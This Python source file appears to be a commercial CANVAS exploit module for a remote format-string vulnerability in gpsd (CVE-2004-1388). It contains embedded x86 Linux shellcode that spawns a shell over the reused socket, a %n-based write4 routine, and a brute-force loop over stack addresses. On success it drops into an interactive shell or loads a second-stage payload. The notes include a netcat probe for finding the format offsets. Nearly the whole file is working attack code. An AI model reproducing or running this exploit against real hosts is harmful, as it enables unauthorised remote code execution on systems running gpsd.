#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")

import os,getopt
import socket
import time

from MOSDEFShellServer import MosdefShellServer
from linuxNode import linuxNode
import shellcode.shellcodeGenerator as shellcodeGenerator
import timeoutsocket
from exploitutils import *
from tcpexploit import tcpexploit

NAME="gpsd"
DESCRIPTION="gpsd"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="BerliOS"
DOCUMENTATION['Date public']='01/26/2005'
DOCUMENTATION['CVE Name'] = 'CVE-2004-1388'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1388'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['References']='http://www.digitalmunition.com/DMA[2005-0125a].txt'
DOCUMENTATION['Note']="""
Vulnerable Versions: gpsd version 1.9.0 through version 2.7

This is a one shot exploit.
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]

NOTES="""
http://gpsd.berlios.de/
    
Blind brute using Rob's idea. The only dependants are the alignment and the dpa
offset. Both of which _should_ be fairly static accross Linux versions I think.

If heaven forbid they're not, you can find the align and dpa ala:

$ echo "PPPAAAABBBB%8\$x%9\$x" | netcat -vv 192.168.0.6 2947
(UNKNOWN) [192.168.0.6] 2947 (gpsd) open
GPSD,P=?,P=?,P=?,A=?,A=?,A=?,A=?,X=1,X=1
 sent 20, rcvd 42
$

# tail /var/log/messages
...
Oct 19 11:58:39 vmware gpsd[571]: gpsd: <= client: PPPAAAABBBB4141414142424242
...
#

Which implies an align of 3 and a dpa of 8. You know the drill.

"""

CHANGELOG="""

"""
    
REQUEST_SIZE = 1024
ALIGN = 3
DPA = 8
PREPEND = "gpsd: <= client: "

# due to the weird gpsd buffering, and not having
# a viable MOSDEF-able select option (afaik) we
# have to do this wacky 'break on special char receive'

def send_and_get(s, data, special='X'):
    """
    returns tuple of return value and error messsage or response
    """
    ret = 0 #error
    #send request
    try:
        s.sendall(data)
    except socket.error:
        s.close()
        return 0, "Could not send data"
    
    #read response
    response = ""
    ret = "A"
    try:
        while ret != "":
            try:
                ret = s.recv(5000)
            except timeoutsocket.Timeout:
                ret = ""
            response += ret
             
            # a succesful trigger send will be a single trigger char
            # a bit bodgy, but whatev .. need to switch to 'GOOO'

            if ret in special:
                break

    except socket.error:
        s.close()
        return 0, "Failed to recv data...remote end died"

    return 1, response

# nat friendly socket recycling code X/O trigger combo
SHELLCODE = ""+\
"\x31\xc9\x31\xdb\x31\xc0\xb3\x0d\x41\xb0\x30\xcd\x80\x31\xc0\x31"+\
"\xc9\xb1\x20\x50\xe2\xfd\x66\xb9\x00\x04\x51\x89\xe6\x31\xdb\x4b"+\
"\x31\xc0\xff\x0e\x3b\x1e\x74\x76\x31\xc9\xb1\x05\x50\xe2\xfd\x89"+\
"\xe7\xb0\x10\x89\x47\x10\x8d\x4f\x10\x51\x57\x31\xdb\xb3\x07\xb0"+\
"\x66\xff\x36\x89\xe1\xcd\x80\x8b\x07\x3c\x0a\x74\x08\x3c\x02\x74"+\
"\x04\x89\xf4\xeb\xc8\x89\xf4\x31\xc0\x31\xc9\xb1\x58\x51\x89\xe1"+\
"\x50\x40\x50\x51\xff\x36\x89\xe1\x31\xc0\x31\xdb\xb3\x09\xb0\x66"+\
"\xcd\x80\x89\xf4\x3c\x01\x75\xa5\x8d\x7e\x04\x8b\x0e\x31\xc0\x31"+\
"\xdb\x31\xd2\xb0\x20\xb2\x04\x43\x39\xc1\x7d\x0c\x85\xc9\x74\x04"+\
"\xd1\xe3\xe2\xf8\x09\x1f\xeb\x85\x29\xc1\x01\xd7\xeb\xea\x31\xdb"+\
"\x66\xbb\x00\x04\x8d\x4e\x04\x31\xd2\x56\x31\xf6\x52\x6a\x04\x89"+\
"\xe7\x31\xc0\xb0\x8e\xcd\x80\x8b\x74\x24\x08\x85\xc0\x74\x44\x8d"+\
"\x66\x04\x31\xc9\x31\xdb\x5f\x80\xfb\x20\x75\x03\x5f\x31\xdb\xd1"+\
"\xef\x72\x0b\x41\x66\x81\xf9\x00\x04\x74\x28\x43\xeb\xe9\x54\x53"+\
"\x51\x31\xc0\x50\x89\xe2\x50\x40\x50\x52\x51\x31\xdb\xb3\x0a\x89"+\
"\xe1\xb0\x66\xcd\x80\x83\xc4\x14\x59\x5b\x5c\x8b\x02\x3c\x4f\x74"+\
"\x0f\xeb\xd0\x81\xc6\x80\x00\x00\x00\x89\xf4\xe9\xfd\xfe\xff\xff"+\
"\x89\xcb\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf4"+\
"\x31\xc0\x31\xd2\x68\x2f\x73\x68\x58\x68\x2f\x62\x69\x6e\x88\x44"+\
"\x24\x07\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port = 2947
        self.host = ""
        self.shellcode = ''
        self.stage2 = ''
        self.badstring = ''
        self.setVersions()
        self.version = 0
        self.name = NAME        
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
        return 
    
    def setVersions(self):
        self.versions={}
        self.versions[0] = ("Automatic")
        self.versions[1] = ("Linux Brute Force") 
        return 

    def neededListenerTypes(self):
        return [] #we steal socket
    
    def createShellcode(self):
        sc = shellcodeGenerator.linux_X86()
        sc.addAttr("setblocking",None)
        sc.addAttr("read_and_exec",{"fdreg": "ebx"})
        self.stage2 = sc.get()
        return self.createLinuxGOShellcode(self.badstring)
    
    def test(self):
        """
        
        """
        self.getargs()
        
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        return 1
    
    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        # keep payload 1024 aligned ..
        self.shellcode = self.createShellcode()
        self.shellcode += 'p' * (1024 - len(self.shellcode))

        self.log("Attacking %s:%d" % (self.host,self.port))
        success = self.runsploit()
        if success:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return success
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        return 0
        
    def write4(self, what, where, align, dpa, prepad):
        """
        Creates the string that does the write4
        """

        self.log("Writing %x to %x"%(what, where))

        fs = 'p' * align
        for i in xrange(0, 4):
            fs += intel_order(where + i)

        prepad += len(fs)

        #self.log("PrePad: %d ... len(fs): %d" % (prepad, len(fs)))

        write1 = (what & 0xff)
        
        #self.log("write1: %x" % write1)

        if (prepad > write1):
            writefill = 0x1000
        else:
            writefill = 0

        write1 += writefill

        write2 = (what & 0xff00) >> 8
        write2 += 0x100 + writefill

        write3 = (what & 0xff0000) >> 16
        write3 += 0x200 + writefill 

        write4 = (what & 0xff000000) >> 24
        write4 += 0x300 + writefill

        fs += "%%.%dx%%%d$n" % (write1 - prepad, dpa)
        fs += "%%.%dx%%%d$n" % (write2 - write1, dpa+1)
        fs += "%%.%dx%%%d$n" % (write3 - write2, dpa+2)
        fs += "%%.%dx%%%d$n" % (write4 - write3, dpa+3)

        #print "fs: " + prettyprint(fs)

        return fs
        
    def runsploit(self):
        """
        Construct the attack
        """
                
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect")
            self.setInfo("%s attacking %s:%d - done (failed: could not connect!)"%(NAME,self.host,self.port))
            return 0

        STEP_SIZE = 0x100
        what = 0x0a0d4141
        where = 0xbffffffc - 0x2000

        while where < (0xbffffffc - STEP_SIZE):

            fs = self.write4(what, where, ALIGN, (REQUEST_SIZE/4) + DPA, REQUEST_SIZE + len(PREPEND))
            request = "R+" * (REQUEST_SIZE/2-1) + "\r\n" + fs + self.shellcode 
            ret, response = send_and_get(s, request)

            if not ret:
                self.log("Failed: %s" % response)
                return 0

            self.log("Got %d reply bytes, counting R's" % len(response))

            r_count = response.count('R')
            expected_r_count = (REQUEST_SIZE/2) - 1

            self.log("Got r_count %d expecting %d" % (r_count, expected_r_count))

            if r_count != expected_r_count:
                self.log("R_count different! Hit buf at %x, confirming what value" % where)
                a_count = response.count('A')
                if a_count == 2:
                    self.log("Buf hit confirmed! a_count=%d" % a_count)
                    bufstart = where - r_count*2

                    what = bufstart + REQUEST_SIZE + len(fs)
                    where = bufstart - 8 * 4                    

                    self.log("Buf start is @ %x ... Shellcode is @ %x" % (bufstart, what))

                    brutetop = where - 4*256
                    while brutetop < where:

                        #alignment and DPA are blind
                        fs = self.write4(what, where, ALIGN, REQUEST_SIZE/4+DPA, REQUEST_SIZE+len(PREPEND))
                        request = "R+" * (REQUEST_SIZE/2-1) + "\r\n" + fs + self.shellcode

                        ret, response = send_and_get(s, request, special='G') # 'X' for normal shell

                        if not ret:
                            self.log("Failed: %s" % response)
                            self.setInfo("Failed to brute force")
                            return 0
                        else:

                            # using the static payload until we fix/clean MOSDEF stubs
                            if 'X' in response and SHELLCODE in self.shellcode:
                                self.log("Got it ... shell mode")
                                s.send('O')
                                import telnetlib
                                t = telnetlib.Telnet()
                                t.sock = s
                                t.write("uname -a;id\n")
                                t.interact()
                                sys.exit(0)

                            elif 'G' in response and 'GPSD' not in response:
                                # MOSDEF
                                self.log("Got it ... MOSDEF mode")
                                s.send('O')

                                if self.stage2 != '':
                                    # sets blocking ... blocking code assumes socket is in ebx
                                    s.send(intel_order(len(self.stage2)))
                                    s.send(self.stage2)

                                newnode = linuxNode()
                                newnode.parentnode = self.argsDict["passednodes"][0]
                                shellServer = MosdefShellServer('Linux', 'i386')
                                shellServer(s, newnode)
                                newnode.startup()

                                self.setSucceeded()
                                return newnode                                

                        where -= 4
                else:
                    self.log("Buf hit not confirmed")

            where += STEP_SIZE

        self.log("Finished without getting a shell :<")
        return 0

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    # handle a node from the command line
    if ret not in [0, 1, None]:
        ret.interact()
